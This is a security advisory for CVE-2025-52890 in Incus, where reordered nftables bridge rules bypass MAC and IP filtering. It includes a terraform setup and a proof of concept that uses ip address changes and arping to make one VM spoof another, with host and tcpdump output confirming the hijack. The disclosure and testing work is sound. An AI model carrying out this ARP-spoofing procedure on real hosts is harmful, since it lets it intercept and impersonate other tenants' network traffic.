# Incus creates nftables rules that partially bypass security options

**GHSA**: GHSA-p7fw-vjjm-2rwp | **CVE**: CVE-2025-52890 | **Severity**: high (CVSS 8.1)

**CWE**: CWE-863

**Affected Packages**:
- **github.com/lxc/incus/v6** (go): >= 6.12.0, <= 6.13.0

## Description

### Summary

When using an ACL on a device connected to a bridge, Incus generates nftables rules that partially bypass security options `security.mac_filtering`, `security.ipv4_filtering` and `security.ipv6_filtering`. This can lead to ARP spoofing on the bridge and to fully spoof another VM/container on the same bridge.

### Details

In commit d137a063c2fe2a6983c995ba75c03731bee1557d, a few rules in the bridge input chain are moved to the top of the chain:

    ct state established,related accept

    iifname "{{.hostName}}" ether type arp accept
    iifname "{{.hostName}}" ip6 nexthdr ipv6-icmp icmpv6 type { nd-neighbor-solicit, nd-neighbor-advert } accept

However, these rules accept packets that should be filtered and maybe dropped by later rules in the "MAC filtering", "IPv4 filtering" and "IPv6 filtering" snippets:

	iifname "{{.hostName}}" ether type arp arp saddr ether != {{.hwAddr}} drop
	iifname "{{.hostName}}" ether type ip6 icmpv6 type 136 @nh,528,48 != {{.hwAddrHex}} drop
    ...
    iifname "{{.hostName}}" ether type arp arp saddr ip != { {{.ipv4NetsList}} } drop
    ...
	iifname "{{.hostName}}" ether type ip6 icmpv6 type 136 {{.ipv6NetsPrefixList}} drop

Basically, the added rules partially bypass the security options `security.mac_filtering`, `security.ipv4_filtering` and `security.ipv6_filtering`. Doing so, they allow an attacker to perform ARP poisoning/spoofing attacks and send malicious Neighbor Advertisement (type 136).

### PoC

With this terraform infrastructure:

```
resource "incus_network_acl" "acl_allow_out" {
  name    = "acl-allow-out"
  egress = [
    {
      action           = "allow"
      destination      = "0.0.0.0-9.255.255.255,11.0.0.0-172.15.255.255,172.32.0.0-192.167.255.255,192.169.0.0-255.255.255.254"
      state            = "enabled"
    },
  ]
}
resource "incus_network_acl" "acl_allow_in" {
  name    = "acl-allow-in"
  ingress = [
    {
      action           = "allow"
      state            = "enabled"
    },
  ]
}

resource "incus_network" "br0" {
  name = "br0"
  config = {
    "ipv4.address"          = "10.0.0.1/24"
    "ipv4.nat"              = "true"
  }
}

resource "incus_instance" "machine1" {
  name  = "machine1"
  image = "images:archlinux/cloud"
  type = "virtual-machine"
  config = {
    "limits.memory" = "2GiB"
    "security.secureboot" = false
    "boot.autostart" = false
    "cloud-init.vendor-data" = <<-EOF
      #cloud-config
      package_update: true
      packages:
        - dhclient
        - tcpdump
      runcmd:
        - systemctl disable --now systemd.networkd.service
        - systemctl disable --now systemd.networkd.socket
    EOF
  }
  device {
    type = "disk"
    name = "root"
    properties = {
      pool = "default"
      path = "/"
      size = "64GiB"
    }
  }
  device {
    type = "nic"
    name = "eth0"
    properties = {
      network = incus_network.br0.name
      "security.ipv4_filtering" = true
      "security.acls" = join(",",
        [
          incus_network_acl.acl_allow_out.name,
          incus_network_acl.acl_allow_in.name,
        ])
    }
  }
}

resource "incus_instance" "machine2" {
  name  = "machine2"
  image = "images:archlinux/cloud"
  type = "virtual-machine"
  config = {
    "limits.memory" = "2GiB"
    "security.secureboot" = false
    "boot.autostart" = false
  }
  device {
    type = "disk"
    name = "root"
    properties = {
      pool = "default"
      path = "/"
      size = "64GiB"
    }
  }
  device {
    type = "nic"
    name = "eth0"
    properties = {
      network = incus_network.br0.name
    }
  }
}
```

An attacker in a VM (machine1) change their IP address to another VM (machine2)'s IP. The malicious change is reflected in the ARP table of the host, bypassing the MAC filtering. When the host emits or forwards a packet to machine2's IP, it is sent to machine1.
In addition, as `ct state established,related accept` is now the first rule in bridge chain input, machine1 can even answer and thus fully spoof the victim on the network.

```bash
[HOST]$ ip n
10.0.0.236 dev br0 lladdr 10:66:6a:88:e6:5b REACHABLE # machine2
10.0.0.2 dev br0 lladdr 10:66:6a:89:39:45 REACHABLE # machine1

# Spoof machine2
[MACHINE1]$ ip add del 10.0.0.2/24 dev enp5s0
[MACHINE1]$ ip add add 10.0.0.236/24 dev enp5s0

# Flood
[MACHINE1]$ arping 10.0.0.1

# Machine2's IP refers to machine1's MAC in host ARP table
[HOST]$ ip n
10.0.0.236 dev br0 lladdr 10:66:6a:89:39:45 STALE

# Packets from the host (or forwarded by the host) to machine2 ...
[HOST]$ ping 10.0.0.236
PING 10.0.0.236 (10.0.0.236) 56(84) bytes of data.
64 bytes from 10.0.0.236: icmp_seq=1 ttl=64 time=1.19 ms

# ... are sent to machine1!
[MACHINE1]$ tcpdump -nei enp5s0
listening on enp5s0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
15:15:17.008470 10:66:6a:99:e0:d8 > 10:66:6a:89:39:45, ethertype IPv4 (0x0800), length 98: 10.0.0.1 > 10.0.0.236: ICMP echo request, id 4, seq 1, length 64
15:15:17.008513 10:66:6a:89:39:45 > 10:66:6a:99:e0:d8, ethertype IPv4 (0x0800), length 98: 10.0.0.236 > 10.0.0.1: ICMP echo reply, id 4, seq 1, length 64
```

### Impact

All versions since d137a063c2fe2a6983c995ba75c03731bee1557d, so basically v6.12 and v6.13.
